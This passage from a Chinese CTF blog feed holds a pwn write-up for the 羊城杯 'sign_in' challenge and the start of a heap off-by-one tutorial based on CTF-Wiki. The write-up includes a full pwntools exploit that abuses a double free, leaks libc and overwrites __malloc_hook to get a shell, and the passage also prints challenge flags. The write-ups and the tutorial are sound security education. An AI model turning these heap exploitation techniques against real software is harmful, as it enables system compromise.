<span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">13</span>))[::-<span class="number">1</span>]:</span><br><span class="line">        code[i] = (code[i] ^ code[i + <span class="number">1</span>])</span><br><span class="line">    <span class="comment"># print(&#x27;&#x27;.join(flag[::-1]))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">        print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment"># step1()</span></span><br><span class="line">    step2()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">58964088b637e50d3a22b9510c1d1ef8</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h3><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>程序是一个堆管理器，有增删查功能。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>释放堆时，没有将指针置零，也没有对堆管理结构体的 inuse 标志位进行检查再释放，造成了 double free 漏洞。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol><li>double free 泄露 unsorted bin 中 chunk 的 指针。</li><li>fastbin attach 想 hook 函数写入 onegadget</li></ol><p>一开始卡第一步泄露了，想着利用 double free 控制堆管理结构体的指针指向 unsorted bin 的 chunk ，指来指去搞不了。</p><p>最后泄露方法是申请一个比较大的 unsorted bin chunk ，释放后放入 bin 中。再申请一个大小合适的 chunk ，比如 unsorted bin 申请大小为 0x80 ，那么再申请一个大小为 0x50 chunk 加上结构体 0x20 ，申请的时候只写入最低一个字节，破坏一字节还是能算出 libc 地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x80+0x10 &#x3D; 0x50+0x10 + 0x20+0x10</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x &#x2F;20gx 0x555555757030</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555757040:0x00000000000000010x0000555555757070</span><br><span class="line">0x555555757050:0x00000000000000620x0000000000000000</span><br><span class="line">0x555555757060:0x00000000000000000x0000000000000061</span><br><span class="line">0x555555757070:0x00007ffff7dd1b610x00007ffff7dd1b78</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570c0:0x00000000000000600x0000000000000031</span><br></pre></td></tr></table></figure><p>后面就是教科书的 fastbin attack 方式了，没有修改功能就在申请 chunk 的时候将 malloc - 0x23 写入，修改 fd 指针，并绕过 fastbin 检查。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./sign_in&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./sign_in&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;183.129.189.60&#x27;</span>,<span class="number">10029</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name,msg</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;game&#x27;s name: \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;game&#x27;s name:\n&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(name))</span><br><span class="line">p.recvuntil(<span class="string">&quot;game&#x27;s message:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;game&#x27;s index:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak unsorted bin fd</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;[2]&#x27;s name :&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libcbase=leak_addr-<span class="number">0x3c4b61</span><span class="comment">#0x7ffff7dd1b61-0x00007ffff7a0d000</span></span><br><span class="line">malloc=libcbase+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc:&quot;</span>+<span class="built_in">hex</span>(malloc))</span><br><span class="line">onegadget=libcbase+<span class="number">0xf1207</span><span class="comment"># 0x4527a</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free fastbin</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack &amp; bypass fastbin check</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(malloc-<span class="number">0x23</span>),<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;skye&#x27;</span>.ljust(<span class="number">0x13</span>,<span class="string">&#x27;a&#x27;</span>)+p64(onegadget),<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a48bv8fad44bca4d76765e4590fb351e</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 羊城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>off_by_one</title>
      <link href="archives/88bb933f/"/>
      <url>archives/88bb933f/</url>
      
        <content type="html"><![CDATA[<h1 id="堆中的-Off-By-One"><a href="#堆中的-Off-By-One" class="headerlink" title="堆中的 Off-By-One"></a>堆中的 Off-By-One</h1><blockquote><p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p></blockquote><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p><h2 id="off-by-one-漏洞原理"><a href="#off-by-one-漏洞原理" class="headerlink" title="off-by-one 漏洞原理"></a>off-by-one 漏洞原理</h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><p>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈[^1]、bss 段等等，但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p><p>[^1]:最简单的是就是利用 off-by-one 泄露 Canary 的值</p><h2 id="off-by-one-利用思路"><a href="#off-by-one-利用思路" class="headerlink" title="off-by-one 利用思路"></a>off-by-one 利用思路</h2><ol><li><strong>溢出字节为可控制任意字节</strong>：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。<strong>也可使用 NULL 字节溢出的方法</strong></li><li><strong>溢出字节为 NULL 字节</strong>：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块[^2]。<ol><li> 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</li><li>另外，这时 <code>prev_inuse</code> 域就会启用，就可以伪造 <code>prev_inuse</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_inuse</code> 找到的块的大小与<code>prev_inuse</code> 是否一致（libc 2.28 之前）。</li></ol></li></ol><p>[^2]:举个利用一个被分配的 chunk size 为 0x101 ，这是 prev_in_use 标记这个 chunk 是被使用状态，如果当我们 off-by-null 将size 覆盖为 0x100 ，那么这个 chunk 就被认为是 空闲状态</p><p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_inuse (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_inuse while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1"></a>示例 1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//这里写成小于等于导致可以多写入一个字节</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input:&quot;</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们自己编写的 my_gets 函数导致了一个 off-by-one 漏洞，原因是 for 循环的边界没有控制好导致写入多执行了一次，这也被称为栅栏错误</p><blockquote><p>wikipedia: 栅栏错误（有时也称为电线杆错误或者灯柱错误）是差一错误的一种。如以下问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">建造一条直栅栏（即不围圈），长 30 米、每条栅栏柱间相隔 3 米，需要多少条栅栏柱？</span><br></pre></td></tr></table></figure><p>最容易想到的答案 10 是错的。这个栅栏有 10 个间隔，11 条栅栏柱。</p></blockquote><p>我们使用 gdb 对程序进行调试，在进行输入前可以看到分配的两个用户区域为 16 字节的堆块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_inuse 域 print ‘A’*17</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例 2"></a>示例 2</h3><p>第二种常见的导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char buffer[40]&#x3D;&quot;&quot;;</span><br><span class="line">    void *chunk1;</span><br><span class="line">    chunk1&#x3D;malloc(24);</span><br><span class="line">    puts(&quot;Get Input&quot;);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    if(strlen(buffer)&#x3D;&#x3D;24)</span><br><span class="line">    &#123;</span><br><span class="line">        strcpy(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序乍看上去没有任何问题（不考虑栈溢出），可能很多人在实际的代码中也是这样写的。 但是 strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。 strlen 是我们很熟悉的计算 ascii 字符串长度的函数，<strong>strlen 在计算字符串长度时是不把结束符 <code>\x00</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>\x00</code></strong> 。这就导致了我们向 chunk1 中写入了 25 个字节，我们使用 gdb 进行调试可以看到这一点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000411 &lt;&#x3D;&#x3D;&#x3D; next chunk</span><br></pre></td></tr></table></figure><p>在我们输入’A’*24 后执行 strcpy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x0000000000000400(11)</span><br></pre></td></tr></table></figure><p>可以看到 next chunk 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one<a href="off-by-null">^3</a>，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。 还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD 0x41424344</span><br><span class="line">内存  0x44,0x43,0x42,0x41</span><br></pre></td></tr></table></figure><h2 id="实例-1-Asis-CTF-2016-b00ks"><a href="#实例-1-Asis-CTF-2016-b00ks" class="headerlink" title="实例 1: Asis CTF 2016 b00ks"></a>实例 1: Asis CTF 2016 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">b00ks</a></h2><blockquote><p>WiKi上没有明确说明题目的环境，多方确认后：如果使用修改结构体指针实现任意地址写，环境应该是 ubuntu 18 ;如果使用 unlink 也就是 wiki 中的简洁方案，ubuntu16&amp;18。</p><p>以下 wp 关于修改结构体指针方法都替换为我自己的版本</p></blockquote><h3 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h3><p>题目是 64 位程序，保护如下所示。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h3><p>题目是一个常见的选单式程序，功能是一个图书管理系统。程序提供了创建、删除、编辑、打印图书的功能。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br></pre></td></tr></table></figure><p>进入程序要求输入一个 author name 长度要求不大于32。</p><p>每本书（chunk）信息用大小为 0x20 的 book 结构体来维护，其中 name 和 description 在堆上分配，结构体中存储的是地址指针。book_name、book_description 大小自定且无限制大小。</p><p>详细结构体如下：（从 my_create 函数中结尾可推出结构体，下面是简化过的）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;<span class="comment">//8bit</span></span><br><span class="line">    <span class="keyword">char</span> *book_name;<span class="comment">//8bit</span></span><br><span class="line">    <span class="keyword">char</span> *book_description;<span class="comment">//8bit</span></span><br><span class="line">    <span class="keyword">int</span> size;    <span class="comment">//8bit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结构体申请好后，同一放置到 off_202010 列表中管理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*((_QWORD *)off_202010 + v2) = book;</span><br></pre></td></tr></table></figure><h3 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>程序编写定义的读入函数 sub_9F5() 存在 null byte off-by-one （后文称该函数为 my_read() ）。来看一下这个函数源码，注意留意最后一次循环的边界输入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">my_read</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )<span class="comment">//没有正确处理最后一个字节写入位置</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;<span class="comment">//漏洞点</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比一下其他调用 my_read 函数的参数就知道为什么输入 author name 会出现 off-b-null ：</p><ul><li>description 可以放 v1 字节，传入参数为 v1-1 ，预留 1 字节</li><li>name 可以放 v1 字节，传入参数为 v1-1 ，预留 1 字节</li></ul><p>但是 my_name 可以放 32 字节，传入参数为 32 ，没有为最后结束符预留一个位置。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h4><h5 id="溢出会影响到哪里？"><a href="#溢出会影响到哪里？" class="headerlink" title="溢出会影响到哪里？"></a>溢出会影响到哪里？</h5><p>我们先看看 author name 溢出的 \x00 会影响到哪里。先一段调试的 exp ，为了方便，在脚本中，输入 author name 为 <code>&quot;a&quot;*0x32</code> ，在申请一个 book ，最后才调用 gdb ，程序打开 PIE 保护我们就打一个断点，方便计算偏移找到 name ：<code>gdb.attach(p,&quot;b *$rebase(0x0B94)&quot;)</code> 。</p><p>先找到 name 和 chunk_list 真实地址：</p><p><img src="img%5Coff-by-one-0.png" alt="off-by-one-0"></p><p>chunk_list 在低地址，从它开始查内存：</p><p><img src="img%5Coff-by-one-1.png" alt="off-by-one-1"></p><p>可以看到实际上不是从 chunk_list 开始存放结构体指针，而是定向到了 0x555555756060 ，从这里开始记录结构体指针（这里我创建了两个 book ）。然后我们观察 name ，在结构体指针前面，name 溢出的会覆盖掉 book1 结构体指针。我们给一次 name 看看效果：</p><p><img src="img%5Coff-by-one-2.png" alt="off-by-one-2"></p><p>这样溢出之后，程序就会去 0x0000555555758300 找 book1 资料，而不是 0x0000555555758330 。那么如果我们能够在 0x0000555555758300 伪造一个 book 结构体，就能利用程序中的输出&amp;修改功能，实现任意读写。程序是 Full RELRO ，就写 hook 。大概思路就是这么个思路，攻击流程：</p><ol><li>author name 填充 0x20 bit</li><li>creat boo1 &amp;&amp; book2，覆盖结束符</li><li>print book1 info 从 author name 泄露 book1 结构体地址</li><li>edit book1 description 填入 payload，构建 fake book1 结构体</li><li>change author name 覆盖 book1 指针，让其指向 fake book1 </li><li>print book1 info 泄露 book2 地址（mmap地址）</li><li>edit book1 来修改 book2 *description 指向 free_hook</li><li>edit book2 修改 free_hook 为 one_gadget</li></ol><h5 id="泄漏-book1-结构体地址"><a href="#泄漏-book1-结构体地址" class="headerlink" title="泄漏 book1 结构体地址"></a>泄漏 book1 结构体地址</h5><p>因为程序中的 my_read 函数存在 null byte off-by-one ，事实上 my_read 读入的结束符 ‘\x00’ 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 ‘\x00’ ，所以这里是存在一个地址泄漏的漏洞。通过打印 author name 就可以获得 pointer array 中第一项的值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 